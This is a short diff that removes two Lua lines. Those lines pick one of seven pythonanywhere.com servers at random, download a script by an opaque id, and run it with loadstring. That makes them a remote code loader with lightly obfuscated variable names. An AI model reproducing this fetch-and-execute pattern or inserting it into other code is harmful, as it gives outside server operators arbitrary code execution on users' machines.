@@ -1,2 +1,0 @@
-local servidores = {"https://lrmods.pythonanywhere.com","https://lrmods3.pythonanywhere.com","https://lrmods4.pythonanywhere.com","https://Lrmods5.pythonanywhere.com","https://Lrmods6.pythonanywhere.com","https://Lrmods7.pythonanywhere.com","https://Lrmods8.pythonanywhere.com"}
-local _1=function(_2)local _3=http_request({Url=servidores[math.random(1,7)].."/public/".._2,Method="GET"})if _3.StatusCode==200 then return loadstring(_3.Body)()end end;_1("1d5d012b9b")
